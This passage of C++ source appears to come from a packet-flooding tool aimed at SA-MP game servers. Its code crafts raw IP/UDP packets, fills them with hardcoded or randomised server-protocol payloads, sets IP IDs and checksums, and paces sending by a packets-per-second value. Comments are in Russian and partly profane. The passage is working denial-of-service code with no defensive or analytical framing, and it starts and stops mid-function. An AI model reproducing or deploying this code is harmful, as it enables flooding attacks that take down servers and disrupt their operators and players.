	memcpy((void*)udph + sizeof(struct udphdr), "\x0a\x9f\xb8\x46\x88\x06\x00\x10\xcf\xfb\x02\x60\x3f\xc0\x00\x1c\x1d\x37\x51\x07\x66\xfb\x71\x3b\xb7\x96\x10\x44\x00\x00\x00\x01\x27\xbf\x00\x00\x00\xa8\xce\xec\xf7\xd8\xa9\x50\x83\xfd\xfd\xc8\x04\x04\x80\x00\x16\x3f\x70\x8d\x90\x02\x00\x20\xcb\xfb\x02\x04\x9e\x4b\x22\xbf\x8b\x96\x36\xbf\x9a\x12\x99\xbe\xf4\xbd\xdd\x44\x6a\x48\xed\xc4\x9d\x11\x73\x41\x00\x00\x00\x00\x3f\xc6\x17\x3f\x70\x8e\x10\x0e\x00\x20\xcf\x32\x03\xbe\x80\x7a\x7f\xc0\x00\x2a\x6d\x78\x11\x3f\x9a\xbb\xb1\x33\x99\x95\x90\x44\x00\x00\x00\x00\x04\x4b\xc0\x00\x03\x23\x33\xe8\xf7\x71\xa4\x47\xfb\xfd\xfd\xac\x04\x64\x80\x00\x18\x3f\x70\x8e\x90\x0c\x00\x20\xcf\x51\x03\x60\x3f\xc0\x00\x1c\xc3\xb7\x91\x0a\x6e\xfb\x31\x3f\x8b\xd5\x90\x44\x00\x00\x00\x00\xe6\x4f\xc0\x00\x01\x64\x9f\xe8\xf6\x38\x1d\x4e\xaf\xfd\xfd\xac\x04\x64\x80\x00", playloadlen);
	iph->id = NumID += htons(1); //прибавляем на +1 к сгенерированому числу идентификатора ип заголовка
	udph->len = htons(sizeof(struct udphdr) + playloadlen); //общий вес udpheader
	udph->check = 0; //Ебнулэнд
	udph->check = US->checksum_tcpudp(iph, udph, udph->len, sizeof(struct udphdr) + playloadlen); //Расчет контрольной суммы UDP датаграммы или TCP заголовка, не доебешся
	if (type == 0)
	{
		usleep(pps);
	}
	return;
}

void Packet::samp_ms10(struct iphdr* iph, struct udphdr* udph)
{
	int playloadlen = 286; //вес пакета udp/ip в байтах 
	void* data = (void*)udph + sizeof(struct udphdr);
	iph->tot_len = sizeof(struct iphdr) + sizeof(struct udphdr) + playloadlen; //общий вес ipheader
	memcpy((void*)udph + sizeof(struct udphdr), "\x48\x33\x38\x67\x0d\x42\x00\x10\xcf\xea\x02\x00\x00\x3f\x8f\x77\x91\x25\x85\xbc\x71\x11\xcb\x15\x90\x40\x00\x00\x00\x02\x5b\xf7\x00\x00\x00\x00\x00\x00\x01\xa5\x04\x04\x80\x00\x91\x66\x70\xce\x9a\x82\x00\x20\xcb\xea\x02\x04\xe1\x38\x10\xbf\x17\x94\x52\xbf\xf1\x86\x9e\xbd\x22\x58\xde\x44\x6c\xf0\xf0\xc4\x68\x91\x61\x41\x00\x00\x00\x00\x3e\x1d\x92\x66\x70\xcf\x1a\x8c\x00\x20\xcf\x24\x03\x60\x3f\xc0\x00\x20\x59\xfa\x11\x0a\x83\xbc\x71\x1e\xcb\x55\x90\x44\x00\x00\x00\x00\x86\x7b\xc0\x00\x02\x4a\x67\x0c\xf4\x28\x13\x9e\x7f\xfd\xfd\xac\x04\x64\x80\x00\x93\x66\x70\xcf\x9a\x8d\x00\x20\xc8\x24\x01\x13\x00\x00\x00\x00\x00\x00\x00\x54\x20\x22\xd0\x0a\xbe\x4a\x24\x8e\x34\x44\x71\xde\xcc\x49\xcd\xa5\x74\x17\x15\x12\x63\xdc\x61\xaa\x83\x1f\xa7\xfd\xc0\x5f\x00\x00\x00\x94\x66\x70\xd0\x1a\x82\x00\x20\xcb\x24\x01\x12\x27\x95\x53\xbe\x0f\x3f\x5e\x3f\xaf\x09\xe7\xbe\x45\xaf\xe3\x44\x8d\xb7\xed\xc4\x3a\x12\xb4\x41\x00\x00\x00\x00\x36\x55\x95\x66\x70\xd0\x9a\x8d\x00\x20\xc8\x5b\x02\xcb\x03\x80\xff\x00\x00\x00\x00\x6d\xa0\x02\xa0\x57\xbd\x0b\x88\xfe\x34\x40\xb7\xde\xac\x45\x94\xf5\x44\x16\x40\x35\x83\xe7\x0f\xf4\x47\x4f\x07\xda\x10\x5d\x00\x00\x00", playloadlen);
	iph->id = NumID += htons(1); //прибавляем на +1 к сгенерированому числу идентификатора ип заголовка
	udph->len = htons(sizeof(struct udphdr) + playloadlen); //общий вес udpheader
	udph->check = 0; //Ебнулэнд
	udph->check = US->checksum_tcpudp(iph, udph, udph->len, sizeof(struct udphdr) + playloadlen); //Расчет контрольной суммы UDP датаграммы или TCP заголовка, не доебешся
	if (type == 0)
	{
		usleep(pps);
	}
	return;
}

void Packet::samp_ms11(struct iphdr* iph, struct udphdr* udph)
{
	int playloadlen = 18; //вес пакета udp/ip в байтах 
	void* data = (void*)udph + sizeof(struct udphdr);
	iph->tot_len = sizeof(struct iphdr) + sizeof(struct udphdr) + playloadlen; //общий вес ipheader
	memcpy((void*)udph + sizeof(struct udphdr), "\x0b\xea\xc8\xa1\xdb\x52\xa0\x14\x69\xe3\x81\x60\x80\x30\x03\x03\x03\x70", playloadlen);
	iph->id = NumID += htons(1); //прибавляем на +1 к сгенерированому числу идентификатора ип заголовка
	udph->len = htons(sizeof(struct udphdr) + playloadlen); //общий вес udpheader
	udph->check = 0; //Ебнулэнд
	udph->check = US->checksum_tcpudp(iph, udph, udph->len, sizeof(struct udphdr) + playloadlen); //Расчет контрольной суммы UDP датаграммы или TCP заголовка, не доебешся
	if (type == 0)
	{
		usleep(pps);
	}
	return;
}

void Packet::samp_ms12(struct iphdr* iph, struct udphdr* udph)
{
	int playloadlen = 50; //вес пакета udp/ip в байтах 
	void* data = (void*)udph + sizeof(struct udphdr);
	iph->tot_len = sizeof(struct iphdr) + sizeof(struct udphdr) + playloadlen; //общий вес ipheader
	memcpy((void*)udph + sizeof(struct udphdr), "\x0c\xea\xb8\x59\x98\xc5\x00\x10\xcf\xe6\x02\x00\x00\x27\x13\x2d\xd1\x06\x5c\xb6\x71\x11\x30\x16\x10\x40\x00\x00\x00\x00\x67\xf7\xc0\x00\x03\xe4\x18\xd4\xed\x6e\x91\x14\x17\xfd\xfd\xfa\x01\x08\x80\x00", playloadlen);
	iph->id = NumID += htons(1); //прибавляем на +1 к сгенерированому числу идентификатора ип заголовка
	udph->len = htons(sizeof(struct udphdr) + playloadlen); //общий вес udpheader
	udph->check = 0; //Ебнулэнд
	udph->check = US->checksum_tcpudp(iph, udph, udph->len, sizeof(struct udphdr) + playloadlen); //Расчет контрольной суммы UDP датаграммы или TCP заголовка, не доебешся
	if (type == 0)
	{
		usleep(pps);
	}
	return;
}

void Packet::samp_ms13(struct iphdr* iph, struct udphdr* udph)
{
	int playloadlen = 181; //вес пакета udp/ip в байтах 
	void* data = (void*)udph + sizeof(struct udphdr);
	iph->tot_len = sizeof(struct iphdr) + sizeof(struct udphdr) + playloadlen; //общий вес ipheader
	memcpy((void*)udph + sizeof(struct udphdr), "\x0e\x6a\xb8\x5a\x58\xc5\x00\x10\xcf\xe6\x02\x00\x00\x36\x93\x2d\xd1\x2f\x5c\xb6\x71\x0e\xb0\x16\x10\x40\x00\x00\x00\x00\x67\xf7\xc0\x00\x02\x03\xcc\xd8\xee\x2e\x8b\x0c\x13\x36\x05\xfa\x01\x08\x80\x00\x1d\xd5\x70\xb5\x31\x86\x00\x40\xd1\xe6\x02\x8f\x04\x00\xc8\x9a\x3e\x3e\x36\x1a\xf9\x3e\xed\x85\x5a\x3f\x5e\x38\x00\x3f\xd2\x5e\x4b\xbf\xec\xe8\xaf\x3e\x98\x37\xb7\x44\xff\x59\xd9\xc4\x50\xab\x4e\x41\x75\x72\x31\xb9\xeb\xf3\x13\x39\xd8\xbe\xa3\x3c\x71\x8b\x88\xb8\xc5\x02\x0d\xb9\xec\x5b\xb1\xb8\x00\x60\xbb\x44\x1e\xd5\x70\xb5\xb1\x8d\x00\x20\xc8\x28\x03\xc8\x00\x80\x00\x00\x00\x08\x00\x79\xd0\x95\x60\x48\xaf\xea\x66\xeb\x24\x43\x7e\x7f\xbc\x44\x2c\x94\xd4\x25\xc1\xbe\x33\xee\x36\x0f\xc0\x31\x08\x6d\xc0\x5f\x00\x00\x00", playloadlen);
	iph->id = NumID += htons(1); //прибавляем на +1 к сгенерированому числу идентификатора ип заголовка
	udph->len = htons(sizeof(struct udphdr) + playloadlen); //общий вес udpheader
	udph->check = 0; //Ебнулэнд
	udph->check = US->checksum_tcpudp(iph, udph, udph->len, sizeof(struct udphdr) + playloadlen); //Расчет контрольной суммы UDP датаграммы или TCP заголовка, не доебешся
	if (type == 0)
	{
		usleep(pps);
	}
	return;
}

void Packet::samp_ms14(struct iphdr* iph, struct udphdr* udph)
{
	int playloadlen = 429; //вес пакета udp/ip в байтах 
	void* data = (void*)udph + sizeof(struct udphdr);
	iph->tot_len = sizeof(struct iphdr) + sizeof(struct udphdr) + playloadlen; //общий вес ipheader
	memcpy((void*)udph + sizeof(struct udphdr), "\x1e\x6a\xb8\x5d\x58\xc2\x00\x10\xcf\x12\x03\x00\x00\x0a\x3f\x6d\x91\x1c\x89\x76\x71\x00\x08\x15\x90\x44\x00\x00\x00\x02\x34\x53\xc0\x00\x00\x00\x00\x00\x01\xa5\x04\x04\x80\x00\x3d\xd5\x70\xbb\x31\x82\x00\x20\xcb\x12\x03\x04\x20\x17\x23\x3e\x61\x73\x7b\xbf\x4c\x5b\xcb\xbd\xf8\xf2\xb6\x44\xa3\xe6\xd8\xc4\x32\xe6\x62\x41\x00\x00\x00\x00\x3f\x55\x3e\xd5\x70\xbb\xb1\x86\x00\x40\xd1\x12\x03\x4d\x04\x00\x8c\xcd\xee\xbd\x7b\x23\x7e\xbf\xd0\xd2\xf4\x3c\x97\x38\x7e\x3f\x1e\xad\xed\xbd\x91\xff\x9f\x3c\x15\x9c\xb4\x44\x91\xd7\xd5\xc4\xd1\xd6\x60\x41\x6e\x69\x05\xba\x6c\xe2\x66\xba\xf6\x18\x8e\xbb\xb2\x01\xde\xb9\x41\x7b\x47\x39\xec\xde\x96\xb7\x00\x00\xaf\x43\x3f\xd5\x70\xbc\x31\x8a\x00\x20\xcf\xe6\x02\x00\x00\x12\xd3\x6d\xd1\x1a\x9d\x36\x71\x00\x30\x16\x10\x40\x00\x00\x00\x00\x67\xf7\xc0\x00\x03\xbe\x3e\x08\xee\xae\x71\x00\x0f\xfd\xfd\xfa\x01\x08\x80\x00\x40\xd5\x70\xbc\xb1\x82\x00\x20\xcb\xe6\x02\x04\x2b\x98\x2d\xbd\x3b\xb5\x0b\x3e\xc1\x5f\x7d\xbf\x07\x4e\xb7\x44\xc5\x76\xd9\xc4\xc9\xe5\x6a\x41\x00\x00\x00\x00\x3f\xc6\x41\xd5\x70\xbd\x31\x86\x00\x40\xd1\xe6\x02\x8f\x04\x00\xc8\x9a\x3e\x3e\x36\x1a\xf9\x3e\xed\x85\x5a\x3f\x5e\x38\x00\x3f\xd2\x5e\x4b\xbf\xec\xe8\xaf\x3e\x98\x37\xb7\x44\xff\x59\xd9\xc4\x50\xab\x4e\x41\x42\xbb\x5c\xb9\x21\x19\x31\x39\xfe\x35\xb7\x3c\x88\x09\xc8\x3a\x39\x71\x22\x3a\x63\xd9\xee\xb8\x00\x60\xbb\x44\x42\xd5\x70\xbd\xb1\x8d\x00\x20\xc8\x28\x03\xc8\x00\x80\x00\x00\x00\x08\x00\x79\x60\x73\x40\x50\xff\xa2\xe0\xcb\x24\x47\xcf\x8f\xcc\x40\xed\xc4\xf4\x2a\xee\x8e\xf3\xe0\xc4\x62\xb0\xe4\x28\x8d\xc0\x5f\x00\x00\x00\x43\xd5\x70\xbe\x31\x82\x00\x20\xcb\x28\x03\x12\x48\x13\x41\xbf\xd5\x1b\x11\xbf\xd1\xb8\xa9\xbe\xc0\xd5\xb2\x44\x46\x45\xfc\xc4\x22\x6c\x5e\x42\x00\x00\x00\x00\x03\x55", playloadlen);
	iph->id = NumID += htons(1); //прибавляем на +1 к сгенерированому числу идентификатора ип заголовка
	udph->len = htons(sizeof(struct udphdr) + playloadlen); //общий вес udpheader
	udph->check = 0; //Ебнулэнд
	udph->check = US->checksum_tcpudp(iph, udph, udph->len, sizeof(struct udphdr) + playloadlen); //Расчет контрольной суммы UDP датаграммы или TCP заголовка, не доебешся
	if (type == 0)
	{
		usleep(pps);
	}
	return;
}

void Packet::samp_ms15(struct iphdr* iph, struct udphdr* udph)
{
	int playloadlen = 38; //вес пакета udp/ip в байтах 
	void* data = (void*)udph + sizeof(struct udphdr);
	iph->tot_len = sizeof(struct iphdr) + sizeof(struct udphdr) + playloadlen; //общий вес ipheader
	memcpy((void*)udph + sizeof(struct udphdr), "\x2c\x6a\xc8\xa7\x9b\x57\xa0\x14\x89\xed\x8d\xa0\x00\x00\x00\x00\x00\x01\x35\x06\xc6\x17\x96\x57\x25\xf3\x03\x86\x23\x96\x63\x36\x53\x86\x33\x03\x53\x00", playloadlen);
	iph->id = NumID += htons(1); //прибавляем на +1 к сгенерированому числу идентификатора ип заголовка
	udph->len = htons(sizeof(struct udphdr) + playloadlen); //общий вес udpheader
	udph->check = 0; //Ебнулэнд
	udph->check = US->checksum_tcpudp(iph, udph, udph->len, sizeof(struct udphdr) + playloadlen); //Расчет контрольной суммы UDP датаграммы или TCP заголовка, не доебешся
	if (type == 0)
	{
		usleep(pps);
	}
	return;
}

void Packet::samp_ms16(struct iphdr* iph, struct udphdr* udph)
{
	int playloadlen = 508; //вес пакета udp/ip в байтах 
	void* data = (void*)udph + sizeof(struct udphdr);
	iph->tot_len = sizeof(struct iphdr) + sizeof(struct udphdr) + playloadlen; //общий вес ipheader
	memcpy((void*)udph + sizeof(struct udphdr), "\x4c\xeb\xc8\x8c\x5b\xc5\x30\x10\x14\x54\xc6\x00\x35\x00\x20\x20\xff\x49\xa1\xae\x6c\x2d\xae\x0e\x4d\xec\x2c\x8e\x6d\x2c\xed\xce\x61\xad\xac\x2e\x8c\xae\x4d\x2c\x2d\x8e\x8c\xaf\x0e\x86\x20\x00\x00\x00\x00\x9a\xd7\x91\x19\x37\x8a\x60\x20\x14\x54\xc6\x00\x35\x00\x20\x21\x1f\x49\xa1\xae\x6c\x2d\xae\x0e\x4d\xec\x2c\x8e\x6d\x2c\xed\xce\x61\xad\xac\x2e\x8c\xae\x4d\x2c\x2d\x8e\x8c\xaf\x0e\x86\x20\x00\x00\x00\x00\x9b\xd7\x91\x19\xb7\x86\x60\x20\x14\x54\xc2\x00\x35\x00\x20\x21\x3a\x47\xe1\x6c\x8c\x2d\xab\xec\xec\xad\xce\x4d\xed\xed\xa1\x6c\x8c\x2d\xab\xec\xec\xad\xce\x4c\x2d\x2d\x80\x00\x00\x00\x00\x9c\xd7\x91\x1a\x37\x8c\x60\x20\x14\x2c\xc8\x00\x33\x00\x5b\x00\x60\x00\x15\xb8\x51\x28\x9f\x84\xbb\x78\x86\xbb\x09\xe8\x20\x00\x00\x00\x11\x7c\x3d\x46\xc0\x00\x06\x88\x60\x00\x12\xc8\x60\x1f\xff\xff\xff\xe0\x00\x9d\xd7\x91\x1a\xb7\x8a\x60\x20\x14\x54\xc6\x00\x33\x00\x40\x20\x1f\x49\xa1\xae\x6c\x2d\xae\x0e\x4d\xec\x2c\x8e\x6d\x2c\xed\xce\x61\xad\xac\x2e\x8c\xae\x4d\x2c\x2d\x8e\x8c\xaf\x0e\x86\x20\x00\x00\x00\x00\x9e\xd7\x91\x1b\x37\x8a\x60\x20\x14\x54\xc6\x00\x33\x00\x40\x20\x3f\x49\xa1\xae\x6c\x2d\xae\x0e\x4d\xec\x2c\x8e\x6d\x2c\xed\xce\x61\xad\xac\x2e\x8c\xae\x4d\x2c\x2d\x8e\x8c\xaf\x0e\x86\x20\x00\x00\x00\x00\x9f\xd7\x91\x1b\xb7\x8a\x60\x20\x14\x54\xc6\x00\x33\x00\x40\x20\x5f\x49\xa1\xae\x6c\x2d\xae\x0e\x4d\xec\x2c\x8e\x6d\x2c\xed\xce\x61\xad\xac\x2e\x8c\xae\x4d\x2c\x2d\x8e\x8c\xaf\x0e\x86\x20\x00\x00\x00\x00\xa0\xd7\x91\x1c\x37\x8a\x60\x20\x14\x54\xc6\x00\x33\x00\x40\x20\x7f\x49\xa1\xae\x6c\x2d\xae\x0e\x4d\xec\x2c\x8e\x6d\x2c\xed\xce\x61\xad\xac\x2e\x8c\xae\x4d\x2c\x2d\x8e\x8c\xaf\x0e\x86\x20\x00\x00\x00\x00\xa1\xd7\x91\x1c\xb7\x8a\x60\x20\x14\x54\xc6\x00\x33\x00\x40\x20\x9f\x49\xa1\xae\x6c\x2d\xae\x0e\x4d\xec\x2c\x8e\x6d\x2c\xed\xce\x61\xad\xac\x2e\x8c\xae\x4d\x2c\x2d\x8e\x8c\xaf\x0e\x86\x20\x00\x00\x00\x00\xa2\xd7\x91\x1d\x37\x8a\x60\x20\x14\x54\xc6\x00\x33\x00\x40\x20\xbf\x49\xa1\xae\x6c\x2d\xae\x0e\x4d\xec\x2c\x8e\x6d\x2c\xed\xce\x61\xad\xac\x2e\x8c\xae\x4d\x2c\x2d\x8e\x8c\xaf\x0e\x86\x20\x00\x00\x00\x00", playloadlen);
	iph->id = NumID += htons(1); //прибавляем на +1 к сгенерированому числу идентификатора ип заголовка
	udph->len = htons(sizeof(struct udphdr) + playloadlen); //общий вес udpheader
	udph->check = 0; //Ебнулэнд
	udph->check = US->checksum_tcpudp(iph, udph, udph->len, sizeof(struct udphdr) + playloadlen); //Расчет контрольной суммы UDP датаграммы или TCP заголовка, не доебешся
	if (type == 0)
	{
		usleep(pps);
	}
	return;
}

void Packet::samp_ms17(struct iphdr* iph, struct udphdr* udph)
{
	char buf[] = { (char)(rand() & 0xFF), (char)(rand() & 0xFF), (char)(rand() & 0xFF) };
	int playloadlen = 3; //вес пакета udp/ip в байтах 
	void* data = (void*)udph + sizeof(struct udphdr);
	iph->tot_len = sizeof(struct iphdr) + sizeof(struct udphdr) + playloadlen; //общий вес ipheader
	memcpy((void*)udph + sizeof(struct udphdr), buf, playloadlen);
	iph->id = NumID += htons(1); //прибавляем на +1 к сгенерированому числу идентификатора ип заголовка
	udph->len = htons(sizeof(struct udphdr) + playloadlen); //общий вес udpheader
	udph->check = 0; //Ебнулэнд
	udph->check = US->checksum_tcpudp(iph, udph, udph->len, sizeof(struct udphdr) + playloadlen); //Расчет контрольной суммы UDP датаграммы или TCP заголовка, не доебешся
	if (type == 0)
	{
		usleep(pps);
	}
	return;
}

void Packet::samp_ms18(struct iphdr* iph, struct udphdr* udph)
{
	char buf[] = { (char)(rand() & 0xFF), (char)(rand() & 0xFF), 0x48, (char)(rand() & 0xFF), (char)(rand() & 0xFF), 0x09, 0xb0, 0x10, 0x14, 0x29, 0xcf, 0x00, 0x23, 0xad, 0x0e, 0x8e, 0x8e, 0x0e, 0x67, 0x45, 0xe5, 0xee, 0xee, 0xee, 0xe5, 0xcc, 0xec, 0x2d, 0xac, 0xa5, 0xad, 0xae, 0x05, 0xce, 0x4e, 0xa5, 0xec, 0xac, 0xa5, 0xcd, 0xae, 0x06, 0x60, 0x00, 0x00, 0x00, 0x00, 0x00, 0x00, 0x00, 0x00, 0x00, 0x00, 0x00, 0x00, 0x00, 0x09, 0x08, 0x40, 0x00 };
	int playloadlen = 60; //вес пакета udp/ip в байтах 
	void* data = (void*)udph + sizeof(struct udphdr);
	iph->tot_len = sizeof(struct iphdr) + sizeof(struct udphdr) + playloadlen; //общий вес ipheader
	memcpy((void*)udph + sizeof(struct udphdr), buf, playloadlen);
	iph->id = NumID += htons(1); //прибавляем на +1 к сгенерированому числу идентификатора ип заголовка
	udph->len = htons(sizeof(struct udphdr) + playloadlen); //общий вес udpheader
	udph->check = 0; //Ебнулэнд
	udph->check = US->checksum_tcpudp(iph, udph, udph->len, sizeof(struct udphdr) + playloadlen); //Расчет контрольной суммы UDP датаграммы или TCP заголовка, не доебешся
	if (type == 0)
	{
		usleep(pps);
	}
	return;
}

void Packet::samp_ms19(struct iphdr* iph, struct udphdr* udph)
{
	int playloadlen = 68; //вес пакета udp/ip в байтах 
	void* data = (void*)udph + sizeof(struct udphdr);
	iph->tot_len = sizeof(struct iphdr) + sizeof(struct udphdr) + playloadlen; //общий вес ipheader
	memcpy((void*)udph + sizeof(struct udphdr), "\x53\x41\x4d\x50\x3e\xe9\x2e\x34\x64\x1e\x69\x00\x02\x00\x26\x00\x10\x00\x00\x00\x53\x41\x2d\x4d\x50\x20\x30\x2e\x33\x20\x53\x65\x72\x76\x65\x72\x18\x00\x00\x00\x43\x69\x74\x79\x20\x6f\x66\x20\x48\x6f\x74\x20\x41\x73\x70\x68\x61\x6c\x74\x20\x30\x2e\x33\x44\x00\x00\x00\x00", playloadlen);
	iph->id = NumID += htons(1); //прибавляем на +1 к сгенерированому числу идентификатора ип заголовка
	udph->len = htons(sizeof(struct udphdr) + playloadlen); //общий вес udpheader
	udph->check = 0; //Ебнулэнд
	udph->check = US->checksum_tcpudp(iph, udph, udph->len, sizeof(struct udphdr) + playloadlen); //Расчет контрольной суммы UDP датаграммы или TCP заголовка, не доебешся
	if (type == 0)
	{
		usleep(pps);
	}
	return;
}

void Packet::samp_ms20(struct iphdr* iph, struct udphdr* udph)
{
	int playloadlen = 60; //вес пакета udp/ip в байтах 
	void* data = (void*)udph + sizeof(struct udphdr);
	iph->tot_len = sizeof(struct iphdr) + sizeof(struct udphdr) + playloadlen; //общий вес ipheader
	memcpy((void*)udph + sizeof(struct udphdr), "\x11\x80\x48\x85\x40\x09\xb0\x10\x14\x29\xcf\x00\x23\xad\x0e\x8e\x8e\x0e\x67\x45\xe5\xee\xee\xee\xe5\xcc\xec\x2d\xac\xa5\xad\xae\x05\xce\x4e\xa5\xec\xac\xa5\xcd\xae\x06\x60\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x09\x08\x40\x00", playloadlen);
	iph->id = NumID += htons(1); //прибавляем на +1 к сгенерированому числу идентификатора ип заголовка
	udph->len = htons(sizeof(struct udphdr) + playloadlen); //общий вес udpheader
	udph->check = 0; //Ебнулэнд
	udph->check = US->checksum_tcpudp(iph, udph, udph->len, sizeof(struct udphdr) + playloadlen); //Расчет контрольной суммы UDP датаграммы или TCP заголовка, не доебешся
	if (type == 0)
	{
		usleep(pps);
	}
	return;
}

void Packet::samp_ms21(struct iphdr* iph, struct udphdr* udph)
{
	int playloadlen = 30; //вес пакета udp/ip в байтах 
	void* data = (void*)udph + sizeof(struct udphdr);
	iph->tot_len = sizeof(struct iphdr) + sizeof(struct udphdr) + playloadlen; //общий вес ipheader
	memcpy((void*)udph + sizeof(struct udphdr), "\x22\x00\x42\xcc\x14\x9b\xeb\x00\x00\x00\x00\x00\x00\x02\xd0\x00\x00\x00\x10\x00\x00\x00\x00\x01\x90\x00\x00\x00\x10\x00", playloadlen);
	iph->id = NumID += htons(1); //прибавляем на +1 к сгенерированому числу идентификатора ип заголовка
	udph->len = htons(sizeof(struct udphdr) + playloadlen); //общий вес udpheader
	udph->check = 0; //Ебнулэнд
	udph->check = US->checksum_tcpudp(iph, udph, udph->len, sizeof(struct udphdr) + playloadlen); //Расчет контрольной суммы UDP датаграммы или TCP заголовка, не доебешся
	if (type == 0)
	{
		usleep(pps);
	}
	return;
}

void Packet::samp_ms22(struct iphdr* iph, struct udphdr* udph)
{
	int playloadlen = 84; //вес пакета udp/ip в байтах 
	void* data = (void*)udph + sizeof(struct udphdr);
	iph->tot_len = sizeof(struct iphdr) + sizeof(struct udphdr) + playloadlen; //общий вес ipheader
	memcpy((void*)udph + sizeof(struct udphdr), "\x2e\x00\x48\x94\x80\x11\x00\x14\x98\xf8\x2a\x5d\x00\x91\x29\x80\x23\xc0\x14\x92\xe2\x00\x64\x2e\xc3\xc0\x5e\x00\x91\x2a\x00\x22\x00\x14\x5e\xf8\x05\x5f\x00\x91\x2a\x80\x2e\x80\x14\x56\xec\xc0\x00\x00\x35\x04\x54\x40\xa5\x74\x14\xc4\xb5\xf4\x45\x25\x54\xe4\xb3\x33\x38\x34\x0f\x01\x00\x00\x00\x60\x00\x91\x2b\x00\x22\x00\x14\x58\xf8\x16", playloadlen);
	iph->id = NumID += htons(1); //прибавляем на +1 к сгенерированому числу идентификатора ип заголовка
	udph->len = htons(sizeof(struct udphdr) + playloadlen); //общий вес udpheader
	udph->check = 0; //Ебнулэнд
	udph->check = US->checksum_tcpudp(iph, udph, udph->len, sizeof(struct udphdr) + playloadlen); //Расчет контрольной суммы UDP датаграммы или TCP заголовка, не доебешся
	if (type == 0)
	{
		usleep(pps);
	}
	return;
}

void Packet::samp_ms23(struct iphdr* iph, struct udphdr* udph)
{
	int playloadlen = 84; //вес пакета udp/ip в байтах 
	void* data = (void*)udph + sizeof(struct udphdr);
	iph->tot_len = sizeof(struct iphdr) + sizeof(struct udphdr) + playloadlen; //общий вес ipheader
	memcpy((void*)udph + sizeof(struct udphdr), "\x60\x00\x48\xad\x80\x11\x00\x14\x98\xf8\x26\xc1\x00\x91\x5b\x80\x23\xc0\x14\x92\xe2\x0f\xb5\x56\x93\xd0\xc2\x00\x91\x5c\x00\x22\x00\x14\x5e\xf8\x17\xc3\x00\x91\x5c\x80\x2e\x80\x14\x56\xec\xc0\x00\x00\x35\x04\x54\x40\xa5\x74\x14\xc4\xb5\xf4\x45\x25\x54\xe4\xb3\x33\x38\x34\x0f\x01\x00\x00\x00\xc4\x00\x91\x5d\x00\x22\x00\x14\x58\xf8\x11", playloadlen);
	iph->id = NumID += htons(1); //прибавляем на +1 к сгенерированому числу идентификатора ип заголовка
	udph->len = htons(sizeof(struct udphdr) + playloadlen); //общий вес udpheader
	udph->check = 0; //Ебнулэнд
	udph->check = US->checksum_tcpudp(iph, udph, udph->len, sizeof(struct udphdr) + playloadlen); //Расчет контрольной суммы UDP датаграммы или TCP заголовка, не доебешся
	if (type == 0)
	{
		usleep(pps);
	}
	return;
}

void Packet::samp_ms24(struct iphdr* iph, struct udphdr* udph)
{
	int playloadlen = 420; //вес пакета udp/ip в байтах 
	void* data = (void*)udph + sizeof(struct udphdr);
	iph->tot_len = sizeof(struct iphdr) + sizeof(struct udphdr) + playloadlen; //общий вес ipheader
	memcpy((void*)udph + sizeof(struct udphdr), "\x71\x80\x48\xb6\x40\x11\x00\x14\x98\xf8\x2b\xe4\x00\x91\x6d\x00\x23\xc0\x14\x92\xe2\x01\xb6\x4e\xf3\xb0\xe5\x00\x91\x6d\x80\x22\x00\x14\x5e\xf8\x09\xe6\x00\x91\x6e\x00\x2e\x80\x14\x56\xec\xc0\x00\x00\x35\x04\x54\x40\xa5\x74\x14\xc4\xb5\xf4\x45\x25\x54\xe4\xb3\x33\x38\x34\x0f\x01\x00\x00\x00\xe7\x00\x91\x6e\x80\x22\x00\x14\x58\xf8\x0a\xe8\x00\x91\x6f\x00\x22\x00\x14\x98\xf8\x10\xe9\x00\x91\x6f\x80\x23\xc0\x14\x92\xe2\x09\x3c\x4b\xc3\xc0\xea\x00\x91\x70\x00\x22\x00\x14\x5e\xf8\x0b\xeb\x00\x91\x70\x80\x2e\x80\x14\x56\xec\xc0\x00\x00\x35\x04\x54\x40\xa5\x74\x14\xc4\xb5\xf4\x45\x25\x54\xe4\xb3\x33\x38\x34\x0f\x01\x00\x00\x00\xec\x00\x91\x71\x00\x22\x00\x14\x58\xf8\x02\xed\x00\x91\x71\x80\x22\x00\x14\x98\xf8\x20\xee\x00\x91\x72\x00\x23\xc0\x14\x92\xe2\x0e\x68\x8b\x53\xd0\xef\x00\x91\x72\x80\x22\x00\x14\x5e\xf8\x10\xf0\x00\x91\x73\x00\x2e\x80\x14\x56\xec\xc0\x00\x00\x35\x04\x54\x40\xa5\x74\x14\xc4\xb5\xf4\x45\x25\x54\xe4\xb3\x33\x38\x34\x0f\x01\x00\x00\x00\xf1\x00\x91\x73\x80\x22\x00\x14\x58\xf8\x12\xf2\x00\x91\x74\x00\x22\x00\x14\x98\xf8\x26\xf3\x00\x91\x74\x80\x23\xc0\x14\x92\xe2\x07\x01\x4b\x83\xd0\xf4\x00\x91\x75\x00\x22\x00\x14\x5e\xf8\x0a\xf5\x00\x91\x75\x80\x2e\x80\x14\x56\xec\xc0\x00\x00\x35\x04\x54\x40\xa5\x74\x14\xc4\xb5\xf4\x45\x25\x54\xe4\xb3\x33\x38\x34\x0f\x01\x00\x00\x00\xf6\x00\x91\x76\x00\x22\x00\x14\x58\xf8\x0a\xf7\x00\x91\x76\x80\x22\x00\x14\x98\xf8\x2f\xf8\x00\x91\x77\x00\x23\xc0\x14\x92\xe2\x05\x13\x09\x83\xd0\xf9\x00\x91\x77\x80\x22\x00\x14\x5e\xf8\x15\xfa\x00\x91\x78\x00\x2e\x80\x14\x56\xec\xc0\x00\x00\x35\x04\x54\x40\xa5\x74\x14\xc4\xb5\xf4\x45\x25\x54\xe4\xb3\x33\x38\x34\x0f\x01\x00\x00\x00\xfb\x00\x91\x78\x80\x22\x00\x14\x58\xf8\x0f", playloadlen);
	iph->id = NumID += htons(1); //прибавляем на +1 к сгенерированому числу идентификатора ип заголовка
	udph->len = htons(sizeof(struct udphdr) + playloadlen); //общий вес udpheader
	udph->check = 0; //Ебнулэнд
	udph->check = US->checksum_tcpudp(iph, udph, udph->len, sizeof(struct udphdr) + playloadlen); //Расчет контрольной суммы UDP датаграммы или TCP заголовка, не доебешся
	if (type == 0)
	{
		usleep(pps);
	}
	return;
}

void Packet::samp_ms25(struct iphdr* iph, struct udphdr* udph)
{
	int playloadlen = 541; //вес пакета udp/ip в байтах 
	void* data = (void*)udph + sizeof(struct udphdr);
	iph->tot_len = sizeof(struct iphdr) + sizeof(struct udphdr) + playloadlen; //общий вес ipheader
